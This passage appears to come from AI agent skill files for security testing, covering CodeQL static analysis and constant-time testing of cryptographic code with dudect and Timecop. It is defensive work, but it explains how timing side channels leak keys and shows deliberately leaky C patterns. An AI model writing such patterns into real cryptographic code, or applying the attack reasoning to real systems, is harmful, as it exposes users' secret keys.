trailofbits/cpp-queries` |\n| Run custom query | `codeql query run --database codeql.db -- path/to/Query.ql` |\n| Test custom queries | `codeql test run -- path/to/test/pack/` |\n\n## Installation\n\n### Installing CodeQL\n\nCodeQL can be installed manually or via Homebrew on macOS/Linux.\n\n**Manual Installation:**\nNavigate to the [CodeQL release page](https://github.com/github/codeql-action/releases) and download the latest bundle for your architecture. The bundle contains the `codeql` binary, query libraries for supported languages, and pre-compiled queries.\n\n**Using Homebrew:**\n```bash\nbrew install --cask codeql\n```\n\n### Keeping CodeQL Up to Date\n\nCodeQL is under active development. Update regularly to benefit from improvements.\n\n**Manual installation:** Download new updates from the [CodeQL release page](https://github.com/github/codeql-action/releases).\n\n**Homebrew installation:**\n```bash\nbrew upgrade codeql\n```\n\n### Verification\n\n```bash\ncodeql --version\n```\n\n## Core Workflow\n\n### Step 1: Build a CodeQL Database\n\nTo build a CodeQL database, you typically need to be able to build the corresponding codebase. Ensure the codebase is in a clean state (e.g., run `make clean`, `go clean`, or similar).\n\n**For compiled languages (C/C++, Swift):**\n```bash\ncodeql database create codeql.db --language=cpp --command='make -j8'\n```\n\nIf using CMake or out-of-source builds, add `--source-root` to specify the source file tree root:\n```bash\ncodeql database create codeql.db --language=cpp --source-root=/path/to/source --command='cmake --build build'\n```\n\n**For interpreted languages (Python, JavaScript):**\n```bash\ncodeql database create codeql.db --language=python\n```\n\n**For languages with auto-detection (Go, Java):**\n```bash\ncodeql database create codeql.db --language=go\n```\n\nFor complex build systems, use the `--command` argument to pass the build command.\n\n### Step 2: Analyze the Database\n\nRun pre-compiled query packs on the database:\n\n```bash\ncodeql database analyze codeql.db --format=sarif-latest --output=results.sarif -- codeql/cpp-queries\n```\n\nOutput formats include SARIF and CSV. SARIF results can be viewed with the [VSCode SARIF Explorer extension](https://marketplace.visualstudio.com/items?itemName=trailofbits.sarif-explorer).\n\n### Step 3: Review Results\n\nSARIF files contain findings with location, severity, and description. Import into your IDE or CI/CD pipeline for review and remediation.\n\n### Installing Third-Party Query Packs\n\nPublished query packs are identified by scope/name/version. For example:\n\n```bash\ncodeql pack download trailofbits/cpp-queries trailofbits/go-queries\n```\n\nFor Trail of Bits public CodeQL queries, see [trailofbits/codeql-queries](https://github.com/trailofbits/codeql-queries).\n\n## How to Customize\n\n### Writing Custom Queries\n\nCodeQL queries use a declarative, object-oriented language called QL with Java-like syntax and SQL-like query expressions.\n\n**Basic query structure:**\n```ql\nimport cpp\n\nfrom FunctionCall call\nwhere call.getTarget().getName() = \"memcpy\"\nselect call.getLocation(), call.getArgument(0)\n```\n\nThis selects all expressions passed as the first argument to `memcpy`.\n\n**Creating a custom class:**\n```ql\nimport cpp\n\nclass MemcpyCall extends FunctionCall {\n  MemcpyCall() {\n    this.getTarget().getName() = \"memcpy\"\n  }\n\n  Expr getDestination() {\n    result = this.getArgument(0)\n  }\n\n  Expr getSource() {\n    result = this.getArgument(1)\n  }\n\n  Expr getSize() {\n    result = this.getArgument(2)\n  }\n}\n\nfrom MemcpyCall call\nselect call.getLocation(), call.getDestination()\n```\n\n### Key Syntax Reference\n\n| Syntax/Operator | Description | Example |\n|-----------------|-------------|---------|\n| `from Type x where P(x) select f(x)` | Query: select f(x) for all x where P(x) is true | `from FunctionCall call where call.getTarget().getName() = \"memcpy\" select call` |\n| `exists(...)` | Existential quantification | `exists(FunctionCall call \\| call.getTarget() = fun)` |\n| `forall(...)` | Universal quantification | `forall(Expr e \\| e = arg.getAChild() \\| e.isConstant())` |\n| `+` | Transitive closure (1+ times) | `start.getASuccessor+()` |\n| `*` | Reflexive transitive closure (0+ times) | `start.getASuccessor*()` |\n| `result` | Special variable for method/function output | `result = this.getArgument(0)` |\n\n### Example: Finding Unhandled Errors\n\n```ql\nimport cpp\n\n/**\n * @name Unhandled error return value\n * @id custom/unhandled-error\n * @description Function calls that return error codes that are not checked\n * @kind problem\n * @problem.severity warning\n * @precision medium\n */\n\npredicate isErrorReturningFunction(Function f) {\n  f.getName().matches(\"%error%\") or\n  f.getName().matches(\"%Error%\")\n}\n\nfrom FunctionCall call\nwhere\n  isErrorReturningFunction(call.getTarget()) and\n  not exists(Expr parent |\n    parent = call.getParent*() and\n    (parent instanceof IfStmt or parent instanceof SwitchStmt)\n  )\nselect call, \"Error return value not checked\"\n```\n\n### Adding Query Metadata\n\nQuery metadata is defined in an initial comment:\n\n```ql\n/**\n * @name Short name for the issue\n * @id scope/query-name\n * @description Longer description of the issue\n * @kind problem\n * @tags security external/cwe/cwe-123\n * @problem.severity error\n * @precision high\n */\n```\n\n**Required fields:**\n- `name`: Short string identifying the issue\n- `id`: Unique identifier (lowercase letters, numbers, `/`, `-`)\n- `description`: Longer description (a few sentences)\n- `kind`: Either `problem` or `path-problem`\n- `problem.severity`: `error`, `warning`, or `recommendation`\n- `precision`: `low`, `medium`, `high`, or `very-high`\n\n**Output format requirements:**\n- `problem` queries: Output must be `(Location, string)`\n- `path-problem` queries: Output must be `(DataFlow::Node, DataFlow::PathNode, DataFlow::PathNode, string)`\n\n### Testing Custom Queries\n\nCreate a test pack with `qlpack.yml`:\n\n```yaml\nname: scope/name-test\nversion: 0.0.1\ndependencies:\n  codeql-query-pack-to-test: \"*\"\nextractor: cpp\n```\n\nCreate a test directory (e.g., `MemcpyCall/`) containing:\n- `test.c`: Source file with code pattern to detect\n- `MemcpyCall.qlref`: Text file with path to the query\n- `MemcpyCall.expected`: Expected output\n\nRun tests:\n```bash\ncodeql test run -- path/to/test/pack/\n```\n\nIf `MemcpyCall.expected` is missing or incorrect, an `MemcpyCall.actual` file is created. Review it, and if correct, rename to `MemcpyCall.expected`.\n\n## Advanced Usage\n\n### Creating New Query Packs\n\nInitialize a query pack:\n```bash\ncodeql pack init <scope>/<name>\n```\n\nThis creates a `qlpack.yml` file:\n```yaml\n---\nlibrary: false\nwarnOnImplicitThis: false\nname: <scope>/<name>\nversion: 0.0.1\n```\n\nAdd standard library dependencies:\n```bash\ncodeql pack add codeql/cpp-all\n```\n\nCreate a workspace file (`codeql-workspace.yml`) for the CLI to work correctly.\n\nInstall dependencies:\n```bash\ncodeql pack install\n```\n\nConfigure the CLI to find your queries by creating `~/.config/codeql/config`:\n```plain\n--search-path /full/path/to/your/codeql/root/directory\n```\n\n### Recommended Directory Structure\n\n```plain\n.\n codeql-workspace.yml\n cpp\n    lib\n       qlpack.yml\n       scope\n           security\n               someLibrary.qll\n    src\n       qlpack.yml\n       suites\n          scope-cpp-code-scanning.qls\n          scope-cpp-security.qls\n       security\n           AppSecAnalysis\n               AppSecAnalysis.c\n               AppSecAnalysis.qhelp\n               AppSecAnalysis.ql\n    test\n        qlpack.yml\n        query-tests\n            security\n                AppSecAnalysis\n                    AppSecAnalysis.c\n                    AppSecAnalysis.expected\n                    AppSecAnalysis.qlref\n```\n\n### Recursion and Transitive Closures\n\n**Recursive predicate:**\n```ql\npredicate isReachableFrom(BasicBlock start, BasicBlock end) {\n  start = end or isReachableFrom(start.getASuccessor(), end)\n}\n```\n\n**Using transitive closure (equivalent):**\n```ql\npredicate isReachableFrom(BasicBlock start, BasicBlock end) {\n  end = start.getASuccessor*()\n}\n```\n\nUse `*` for zero or more applications, `+` for one or more.\n\n### Excluding Individual Files\n\nCodeQL instruments the build process. If object files already exist and are up-to-date, corresponding source files won't be added to the database. This can reduce database size but means CodeQL has only partial knowledge about excluded files and cannot reason about data flow through them.\n\n**Recommendation:** Include third-party libraries and filter issues based on location rather than excluding files during database creation.\n\n### Editor Support\n\n**VSCode:** [CodeQL extension](https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql) provides LSP support, syntax highlighting, query running, and AST visualization.\n\n**Neovim:** [codeql.nvim](https://github.com/pwntester/codeql.nvim) provides similar functionality.\n\n**Helix/Other editors:** Use the CodeQL LSP server and [Tree-sitter grammar for CodeQL](https://github.com/tree-sitter/tree-sitter-ql).\n\n**VSCode Quick Query:** Use \"CodeQL: Quick Query\" command to run single queries against a database.\n\n**Debugging queries:** Add database source to workspace, then use \"CodeQL: View AST\" to display the AST for individual nodes.\n\n## Configuration\n\n### CodeQL Standard Libraries\n\nCodeQL standard libraries are language-specific. Refer to API documentation:\n\n- [C and C++](https://codeql.github.com/codeql-standard-libraries/cpp/)\n- [Go](https://codeql.github.com/codeql-standard-libraries/go/)\n- [Java and Kotlin](https://codeql.github.com/codeql-standard-libraries/java/)\n- [JavaScript and TypeScript](https://codeql.github.com/codeql-standard-libraries/javascript/)\n- [Python](https://codeql.github.com/codeql-standard-libraries/python/)\n- [C#](https://codeql.github.com/codeql-standard-libraries/csharp/)\n- [Ruby](https://codeql.github.com/codeql-standard-libraries/ruby/)\n- [Swift](https://codeql.github.com/codeql-standard-libraries/swift/)\n\n### Supported Languages\n\nCodeQL supports C/C++, C#, Go, Java, Kotlin, JavaScript, TypeScript, Python, Ruby, and Swift. Check [supported languages and frameworks](https://codeql.github.com/docs/codeql-overview/supported-languages-and-frameworks) for details.\n\n## CI/CD Integration\n\n### GitHub Actions\n\nEnable code scanning from \"Code security and analysis\" in repository settings. Choose default or advanced setup.\n\n**Advanced setup workflow:**\n```yaml\nname: \"CodeQL\"\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n  schedule:\n    - cron: '34 10 * * 6'\n\njobs:\n  analyze:\n    name: Analyze\n    runs-on: ${{ (matrix.language == 'swift' && 'macos-latest') || 'ubuntu-latest' }}\n    timeout-minutes: ${{ (matrix.language == 'swift' && 120) || 360 }}\n\n    permissions:\n      actions: read\n      contents: read\n      security-events: write\n\n    strategy:\n      fail-fast: false\n      matrix:\n        language: [ 'cpp' ]\n\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v4\n\n    - name: Initialize CodeQL\n      uses: github/codeql-action/init@v3\n      with:\n        languages: ${{ matrix.language }}\n\n    - name: Autobuild\n      uses: github/codeql-action/autobuild@v3\n\n    - name: Perform CodeQL Analysis\n      uses: github/codeql-action/analyze@v3\n      with:\n        category: \"/language:${{matrix.language}}\"\n```\n\nFor compiled languages, replace autobuild with custom build commands:\n```yaml\n- run: |\n    make -j8\n```\n\n### Using Custom Queries in CI\n\nSpecify query packs and queries in the \"Initialize CodeQL\" step:\n\n```yaml\n- uses: github/codeql-action/init@v3\n  with:\n    queries: security-extended,security-and-quality\n    packs: trailofbits/cpp-queries\n```\n\nFor repository-local queries:\n```yaml\n- uses: github/codeql-action/init@v3\n  with:\n    queries: ./codeql/UnhandledError.ql\n    packs: trailofbits/cpp-queries\n```\n\nNote the `.` prefix for repository-relative paths. All queries must be part of a query pack with a `qlpack.yml` file.\n\n### Testing Custom Queries in CI\n\n```yaml\nname: Test CodeQL queries\n\non: [push, pull_request]\n\njobs:\n  codeql-test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - id: init\n        uses: github/codeql-action/init@v3\n      - uses: actions/cache@v4\n        with:\n          path: ~/.codeql\n          key: ${{ runner.os }}-${{ runner.arch }}-${{ steps.init.outputs.codeql-version }}\n      - name: Run tests\n        run: |\n          ${{ steps.init.outputs.codeql-path }} test run ./path/to/query/tests/\n```\n\nThis workflow caches query extraction and compilation for faster subsequent runs.\n\n## Common Mistakes\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| Not building project before creating database | CodeQL won't have complete information | Run `make clean` or equivalent, then build with CodeQL |\n| Excluding third-party libraries from database | Prevents interprocedural analysis through library code | Include libraries, filter results by location |\n| Using relative imports in query packs | Causes resolution issues | Use absolute imports from standard libraries |\n| Not adding query metadata | SARIF output lacks severity, description | Always add metadata comment with required fields |\n| Forgetting workspace file | CLI won't find query packs | Create `codeql-workspace.yml` in root directory |\n\n## Limitations\n\n- **Licensing:** Closed-source repositories require GitHub Enterprise or Advanced Security license\n- **Build requirement:** Compiled languages must be buildable; no build = incomplete database\n- **Performance:** Complex interprocedural queries can take a long time on large codebases\n- **Language support:** Limited to CodeQL-supported languages and frameworks\n- **Learning curve:** Steep learning curve for writing custom queries; documentation is scant\n- **Single-language databases:** Each database is for one language; multi-language projects need multiple databases\n\n## Related Skills\n\n| Skill | When to Use Together |\n|-------|---------------------|\n| **semgrep** | Use Semgrep first for quick pattern-based analysis, then CodeQL for deeper interprocedural analysis |\n| **sarif-parsing** | For processing CodeQL SARIF output in custom CI/CD pipelines |\n\n## Resources\n\n### Trail of Bits Blog Posts on CodeQL\n\n- [Look out! Divergent representations are everywhere!](https://blog.trailofbits.com/2022/11/10/divergent-representations-variable-overflows-c-compiler/)\n- [Finding unhandled errors using CodeQL](https://blog.trailofbits.com/2022/01/11/finding-unhandled-errors-using-codeql/)\n- [Detecting iterator invalidation with CodeQL](https://blog.trailofbits.com/2020/10/09/detecting-iterator-invalidation-with-codeql/)\n\n### Learning Resources\n\n- [CodeQL zero to hero part 1: The fundamentals of static analysis for vulnerability research](https://github.blog/2023-03-31-codeql-zero-to-hero-part-1-the-fundamentals-of-static-analysis-for-vulnerability-research/)\n- [QL language tutorials](https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/)\n- [GitHub Security Lab CodeQL CTFs](https://securitylab.github.com/ctf/)\n\n### Writing Custom CodeQL Queries\n\n- [Practical introduction to CodeQL](https://jorgectf.github.io/blog/post/practical-codeql-introduction/)\n- [Sharing security expertise through CodeQL packs (Part I)](https://github.blog/2022-04-19-sharing-security-expertise-through-codeql-packs-part-i/)\n\n### Video Resources\n\n- [Trail of Bits: Introduction to CodeQL - Examples, Tools and CI Integration](https://www.youtube.com/watch?v=rQRlnUQPXDw)\n- [Finding Security Vulnerabilities in C/C++ with CodeQL](https://www.youtube.com/watch?v=eAjecQrfv3o)\n- [Finding Security Vulnerabilities in JavaScript with CodeQL](https://www.youtube.com/watch?v=pYzfGaLTqC0)\n- [Finding Security Vulnerabilities in Java with CodeQL](https://www.youtube.com/watch?v=nvCd0Ee4FgE)\n\n### Using CodeQL for Vulnerability Discovery\n\n- [Clang checkers and CodeQL queries for detecting untrusted pointer derefs and tainted loop conditions](https://www.zerodayinitiative.com/blog/2022/2/22/clang-checkers-and-codeql-queries-for-detecting-untrusted-pointer-derefs-and-tainted-loop-conditions)\n- [Heap exploitation with CodeQL](https://github.com/google/security-research/blob/master/analysis/kernel/heap-exploitation/README.md)\n- [Interesting kernel objects dashboard](https://lookerstudio.google.com/reporting/68b02863-4f5c-4d85-b3c1-992af89c855c/page/n92nD)\n\n### CodeQL in CI/CD\n\n- [Blue-teaming for Exiv2: adding custom CodeQL queries to code scanning](https://github.blog/2021-11-16-adding-custom-codeql-queries-code-scanning/)\n- [Best practices on rolling out code scanning at enterprise scale](https://github.blog/2022-09-28-best-practices-on-rolling-out-code-scanning-at-enterprise-scale/)\n- [Fine tuning CodeQL scans using query filters](https://colinsalmcorner.com/fine-tuning-codeql-scans/)\n",
        "plugins/testing-handbook-skills/skills/constant-time-testing/SKILL.md": "---\nname: constant-time-testing\ntype: domain\ndescription: >\n  Constant-time testing detects timing side channels in cryptographic code.\n  Use when auditing crypto implementations for timing vulnerabilities.\n---\n\n# Constant-Time Testing\n\nTiming attacks exploit variations in execution time to extract secret information from cryptographic implementations. Unlike cryptanalysis that targets theoretical weaknesses, timing attacks leverage implementation flaws - and they can affect any cryptographic code.\n\n## Background\n\nTiming attacks were introduced by [Kocher](https://paulkocher.com/doc/TimingAttacks.pdf) in 1996. Since then, researchers have demonstrated practical attacks on RSA ([Schindler](https://link.springer.com/content/pdf/10.1007/3-540-44499-8_8.pdf)), OpenSSL ([Brumley and Boneh](https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf)), AES implementations, and even post-quantum algorithms like [Kyber](https://eprint.iacr.org/2024/1049.pdf).\n\n### Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| Constant-time | Code path and memory accesses independent of secret data |\n| Timing leakage | Observable execution time differences correlated with secrets |\n| Side channel | Information extracted from implementation rather than algorithm |\n| Microarchitecture | CPU-level timing differences (cache, division, shifts) |\n\n### Why This Matters\n\nTiming vulnerabilities can:\n- **Expose private keys** - Extract secret exponents in RSA/ECDH\n- **Enable remote attacks** - Network-observable timing differences\n- **Bypass cryptographic security** - Undermine theoretical guarantees\n- **Persist silently** - Often undetected without specialized analysis\n\nTwo prerequisites enable exploitation:\n1. **Access to oracle** - Sufficient queries to the vulnerable implementation\n2. **Timing dependency** - Correlation between execution time and secret data\n\n### Common Constant-Time Violation Patterns\n\nFour patterns account for most timing vulnerabilities:\n\n```c\n// 1. Conditional jumps - most severe timing differences\nif(secret == 1) { ... }\nwhile(secret > 0) { ... }\n\n// 2. Array access - cache-timing attacks\nlookup_table[secret];\n\n// 3. Integer division (processor dependent)\ndata = secret / m;\n\n// 4. Shift operation (processor dependent)\ndata = a << secret;\n```\n\n**Conditional jumps** cause different code paths, leading to vast timing differences.\n\n**Array access** dependent on secrets enables cache-timing attacks, as shown in [AES cache-timing research](https://cr.yp.to/antiforgery/cachetiming-20050414.pdf).\n\n**Integer division and shift operations** leak secrets on certain CPU architectures and compiler configurations.\n\nWhen patterns cannot be avoided, employ [masking techniques](https://link.springer.com/chapter/10.1007/978-3-642-38348-9_9) to remove correlation between timing and secrets.\n\n### Example: Modular Exponentiation Timing Attacks\n\nModular exponentiation (used in RSA and Diffie-Hellman) is susceptible to timing attacks. RSA decryption computes:\n\n$$ct^{d} \\mod{N}$$\n\nwhere $d$ is the secret exponent. The *exponentiation by squaring* optimization reduces multiplications to $\\log{d}$:\n\n$$\n\\begin{align*}\n& \\textbf{Input: } \\text{base }y,\\text{exponent } d=\\{d_n,\\cdots,d_0\\}_2,\\text{modulus } N \\\\\n& r = 1 \\\\\n& \\textbf{for } i=|n| \\text{ downto } 0: \\\\\n& \\quad\\textbf{if } d_i == 1: \\\\\n& \\quad\\quad r = r * y \\mod{N} \\\\\n& \\quad y = y * y \\mod{N} \\\\\n& \\textbf{return }r\n\\end{align*}\n$$\n\nThe code branches on exponent bit $d_i$, violating constant-time principles. When $d_i = 1$, an additional multiplication occurs, increasing execution time and leaking bit information.\n\nMontgomery multiplication (commonly used for modular arithmetic) also leaks timing: when intermediate values exceed modulus $N$, an additional reduction step is required. An attacker constructs inputs $y$ and $y'$ such that:\n\n$$\n\\begin{align*}\ny^2 < y^3 < N \\\\\ny'^2 < N \\leq y'^3\n\\end{align*}\n$$\n\nFor $y$, both multiplications take time $t_1+t_1$. For $y'$, the second multiplication requires reduction, taking time $t_1+t_2$. This timing difference reveals whether $d_i$ is 0 or 1.\n\n## When to Use\n\n**Apply constant-time analysis when:**\n- Auditing cryptographic implementations (primitives, protocols)\n- Code handles secret keys, passwords, or sensitive cryptographic material\n- Implementing crypto algorithms from scratch\n- Reviewing PRs that touch crypto code\n- Investigating potential timing vulnerabilities\n\n**Consider alternatives when:**\n- Code does not process secret data\n- Public algorithms with no secret inputs\n- Non-cryptographic timing requirements (performance optimization)\n\n## Quick Reference\n\n| Scenario | Recommended Approach | Skill |\n|----------|---------------------|-------|\n| Prove absence of leaks | Formal verification | SideTrail, ct-verif, FaCT |\n| Detect statistical timing differences | Statistical testing | **dudect** |\n| Track secret data flow at runtime | Dynamic analysis | **timecop** |\n| Find cache-timing vulnerabilities | Symbolic execution | Binsec, pitchfork |\n\n## Constant-Time Tooling Categories\n\nThe cryptographic community has developed four categories of timing analysis tools:\n\n| Category | Approach | Pros | Cons |\n|----------|----------|------|------|\n| **Formal** | Mathematical proof on model | Guarantees absence of leaks | Complexity, modeling assumptions |\n| **Symbolic** | Symbolic execution paths | Concrete counterexamples | Time-intensive path exploration |\n| **Dynamic** | Runtime tracing with marked secrets | Granular, flexible | Limited coverage to executed paths |\n| **Statistical** | Measure real execution timing | Practical, simple setup | No root cause, noise sensitivity |\n\n### 1. Formal Tools\n\nFormal verification mathematically proves timing properties on an abstraction (model) of code. Tools create a model from source/binary and verify it satisfies specified properties (e.g., variables annotated as secret).\n\n**Popular tools:**\n- [SideTrail](https://github.com/aws/s2n-tls/tree/main/tests/sidetrail)\n- [ct-verif](https://github.com/imdea-software/verifying-constant-time)\n- [FaCT](https://github.com/plsyssec/fact)\n\n**Strengths:** Proof of absence, language-agnostic (LLVM bytecode)\n**Weaknesses:** Requires expertise, modeling assumptions may miss real-world issues\n\n### 2. Symbolic Tools\n\nSymbolic execution analyzes how paths and memory accesses depend on symbolic variables (secrets). Provides concrete counterexamples. Focus on cache-timing attacks.\n\n**Popular tools:**\n- [Binsec](https://github.com/binsec/binsec)\n- [pitchfork](https://github.com/PLSysSec/haybale-pitchfork)\n\n**Strengths:** Concrete counterexamples aid debugging\n**Weaknesses:** Path explosion leads to long execution times\n\n### 3. Dynamic Tools\n\nDynamic analysis marks sensitive memory regions and traces execution to detect timing-dependent operations.\n\n**Popular tools:**\n- [Memsan](https://clang.llvm.org/docs/MemorySanitizer.html): [Tutorial](https://crocs-muni.github.io/ct-tools/tutorials/memsan)\n- **Timecop** (see below)\n\n**Strengths:** Granular control, targeted analysis\n**Weaknesses:** Coverage limited to executed paths\n\n> **Detailed Guidance:** See the **timecop** skill for setup and usage.\n\n### 4. Statistical Tools\n\nExecute code with various inputs, measure elapsed time, and detect inconsistencies. Tests actual implementation including compiler optimizations and architecture.\n\n**Popular tools:**\n- **dudect** (see below)\n- [tlsfuzzer](https://github.com/tlsfuzzer/tlsfuzzer)\n\n**Strengths:** Simple setup, practical real-world results\n**Weaknesses:** No root cause info, noise obscures weak signals\n\n> **Detailed Guidance:** See the **dudect** skill for setup and usage.\n\n## Testing Workflow\n\n```\nPhase 1: Static Analysis        Phase 2: Statistical Testing\n            \n Identify secret             Detect timing   \n data flow                    differences     \n Tool: ct-verif               Tool: dudect    \n            \n                                       \nPhase 4: Root Cause             Phase 3: Dynamic Tracing\n            \n Pinpoint leak               Track secret    \n location                     propagation     \n Tool: Timecop                Tool: Timecop   \n            \n```\n\n**Recommended approach:**\n1. **Start with dudect** - Quick statistical check for timing differences\n2. **If leaks found** - Use Timecop to pinpoint root cause\n3. **For high-assurance** - Apply formal verification (ct-verif, SideTrail)\n4. **Continuous monitoring** - Integrate dudect into CI pipeline\n\n## Tools and Approaches\n\n### Dudect - Statistical Analysis\n\n[Dudect](https://github.com/oreparaz/dudect/) measures execution time for two input classes (fixed vs random) and uses Welch's t-test to detect statistically significant differences.\n\n> **Detailed Guidance:** See the **dudect** skill for complete setup, usage patterns, and CI integration.\n\n#### Quick Start for Constant-Time Analysis\n\n```c\n#define DUDECT_IMPLEMENTATION\n#include \"dudect.h\"\n\nuint8_t do_one_computation(uint8_t *data) {\n    // Code to measure goes here\n}\n\nvoid prepare_inputs(dudect_config_t *c, uint8_t *input_data, uint8_t *classes) {\n    for (size_t i = 0; i < c->number_measurements; i++) {\n        classes[i] = randombit();\n        uint8_t *input = input_data + (size_t)i * c->chunk_size;\n        if (classes[i] == 0) {\n            // Fixed input class\n        } else {\n            // Random input class\n        }\n    }\n}\n```\n\n**Key advantages:**\n- Simple C header-only integration\n- Statistical rigor via Welch's t-test\n- Works with compiled binaries (real-world conditions)\n\n**Key limitations:**\n- No root cause information when leak detected\n- Sensitive to measurement noise\n- Cannot guarantee absence of leaks (statistical confidence only)\n\n### Timecop - Dynamic Tracing\n\n[Timecop](https://post-apocalyptic-crypto.org/timecop/) wraps Valgrind to detect runtime operations dependent on secret memory regions.\n\n> **Detailed Guidance:** See the **timecop** skill for installation, examples, and debugging.\n\n#### Quick Start for Constant-Time Analysis\n\n```c\n#include \"valgrind/memcheck.h\"\n\n#define poison(addr, len) VALGRIND_MAKE_MEM_UNDEFINED(addr, len)\n#define unpoison(addr, len) VALGRIND_MAKE_MEM_DEFINED(addr, len)\n\nint main() {\n    unsigned long long secret_key = 0x12345678;\n\n    // Mark secret as poisoned\n    poison(&secret_key, sizeof(secret_key));\n\n    // Any branching or memory access dependent on secret_key\n    // will be reported by Valgrind\n    crypto_operation(secret_key);\n\n    unpoison(&secret_key, sizeof(secret_key));\n}\n```\n\nRun with Valgrind:\n```bash\nvalgrind --leak-check=full --track-origins=yes ./binary\n```\n\n**Key advantages:**\n- Pinpoints exact line of timing leak\n- No code instrumentation required\n- Tracks secret propagation through execution\n\n**Key limitations:**\n- Cannot detect microarchitecture timing differences\n- Coverage limited to executed paths\n- Performance overhead (runs on synthetic CPU)\n\n## Implementation Guide\n\n### Phase 1: Initial Assessment\n\n**Identify cryptographic code handling secrets:**\n- Private keys, exponents, nonces\n- Password hashes, authentication tokens\n- Encryption/decryption operations\n\n**Quick statistical check:**\n1. Write dudect harness for the crypto function\n2. Run for 5-10 minutes with `timeout 600 ./ct_test`\n3. Monitor t-value: high absolute values indicate leakage\n\n**Tools:** dudect\n**Expected time:** 1-2 hours (harness writing + initial run)\n\n### Phase 2: Detailed Analysis\n\nIf dudect detects leakage:\n\n**Root cause investigation:**\n1. Mark secret variables with Timecop `poison()`\n2. Run under Valgrind to identify exact line\n3. Review the four common violation patterns\n4. Check assembly output for conditional branches\n\n**Tools:** Timecop, compiler output (`objdump -d`)\n\n### Phase 3: Remediation\n\n**Fix the timing leak:**\n- Replace conditional branches with constant-time selection (bitwise operations)\n- Use constant-time comparison functions\n- Replace array lookups with constant-time alternatives or masking\n- Verify compiler doesn't optimize away constant-time code\n\n**Re-verify:**\n1. Run dudect again for extended period (30+ minutes)\n2. Test across different compilers and optimization levels\n3. Test on different CPU architectures\n\n### Phase 4: Continuous Monitoring\n\n**Integrate into CI:**\n- Add dudect tests to test suite\n- Run for fixed duration (5-10 minutes in CI)\n- Fail build if leakage detected\n\nSee the **dudect** skill for CI integration examples.\n\n## Common Vulnerabilities\n\n| Vulnerability | Description | Detection | Severity |\n|---------------|-------------|-----------|----------|\n| Secret-dependent branch | `if (secret_bit) { ... }` | dudect, Timecop | CRITICAL |\n| Secret-dependent array access | `table[secret_index]` | Timecop, Binsec | HIGH |\n| Variable-time division | `result = x / secret` | Timecop | MEDIUM |\n| Variable-time shift | `result = x << secret` | Timecop | MEDIUM |\n| Montgomery reduction leak | Extra reduction when intermediate > N | dudect | HIGH |\n\n### Secret-Dependent Branch: Deep Dive\n\n**The vulnerability:**\nExecution time differs based on whether branch is taken. Common in optimized modular exponentiation (square-and-multiply).\n\n**How to detect with dudect:**\n```c\nuint8_t do_one_computation(uint8_t *data) {\n    uint64_t base = ((uint64_t*)data)[0];\n    uint64_t exponent = ((uint64_t*)data)[1]; // Secret!\n    return mod_exp(base, exponent, MODULUS);\n}\n\nvoid prepare_inputs(dudect_config_t *c, uint8_t *input_data, uint8_t *classes) {\n    for (size_t i = 0; i < c->number_measurements; i++) {\n        classes[i] = randombit();\n        uint64_t *input = (uint64_t*)(input_data + i * c->chunk_size);\n        input[0] = rand(); // Random base\n        input[1] = (classes[i] == 0) ? FIXED_EXPONENT : rand(); // Fixed vs random\n    }\n}\n```\n\n**How to detect with Timecop:**\n```c\npoison(&exponent, sizeof(exponent));\nresult = mod_exp(base, exponent, modulus);\nunpoison(&exponent, sizeof(exponent));\n```\n\nValgrind will report:\n```\nConditional jump or move depends on uninitialised value(s)\n  at 0x40115D: mod_exp (example.c:14)\n```\n\n**Related skill:** **dudect**, **timecop**\n\n## Case Studies\n\n### Case Study: OpenSSL RSA Timing Attack\n\nBrumley and Boneh (2005) extracted RSA private keys from OpenSSL over a network. The vulnerability exploited Montgomery multiplication's variable-time reduction step.\n\n**Attack vector:** Timing differences in modular exponentiation\n**Detection approach:** Statistical analysis (precursor to dudect)\n**Impact:** Remote key extraction\n\n**Tools used:** Custom timing measurement\n**Techniques applied:** Statistical analysis, chosen-ciphertext queries\n\n### Case Study: KyberSlash\n\nPost-quantum algorithm Kyber's reference implementation contained timing vulnerabilities in polynomial operations. Division operations leaked secret coefficients.\n\n**Attack vector:** Secret-dependent division timing\n**Detection approach:** Dynamic analysis and statistical testing\n**Impact:** Secret key recovery in post-quantum cryptography\n\n**Tools used:** Timing measurement tools\n**Techniques applied:** Differential timing analysis\n\n## Advanced Usage\n\n### Tips and Tricks\n\n| Tip | Why It Helps |\n|-----|--------------|\n| Pin dudect to isolated CPU core (`taskset -c 2`) | Reduces OS noise, improves signal detection |\n| Test multiple compilers (gcc, clang, MSVC) | Optimizations may introduce or remove leaks |\n| Run dudect for extended periods (hours) | Increases statistical confidence |\n| Minimize non-crypto code in harness | Reduces noise that masks weak signals |\n| Check assembly output (`objdump -d`) | Verify compiler didn't introduce branches |\n| Use `-O3 -march=native` in testing | Matches production optimization levels |\n\n### Common Mistakes\n\n| Mistake | Why It's Wrong | Correct Approach |\n|---------|----------------|------------------|\n| Only testing one input distribution | May miss leaks visible with other patterns | Test fixed-vs-random, fixed-vs-fixed-different, etc. |\n| Short dudect runs (< 1 minute) | Insufficient measurements for weak signals | Run 5-10+ minutes, longer for high assurance |\n| Ignoring compiler optimization levels | `-O0` may hide leaks present in `-O3` | Test at production optimization level |\n| Not testing on target architecture | x86 vs ARM have different timing characteristics | Test on deployment platform |\n| Marking too much as secret in Timecop | False positives, unclear results | Mark only true secrets (keys, not public data) |\n\n## Related Skills\n\n### Tool Skills\n\n| Skill | Primary Use in Constant-Time Analysis |\n|-------|---------------------------------------|\n| **dudect** | Statistical detection of timing differences via Welch's t-test |\n| **timecop** | Dynamic tracing to pinpoint exact location of timing leaks |\n\n### Technique Skills\n\n| Skill | When to Apply |\n|-------|---------------|\n| **coverage-analysis** | Ensure test inputs exercise all code paths in crypto function |\n| **ci-integration** | Automate constant-time testing in continuous integration pipeline |\n\n### Related Domain Skills\n\n| Skill | Relationship |\n|-------|--------------|\n| **crypto-testing** | Constant-time analysis is essential component of cryptographic testing |\n| **fuzzing** | Fuzzing crypto code may trigger timing-dependent paths |\n\n## Skill Dependency Map\n\n```\n                    \n                      constant-time-analysis 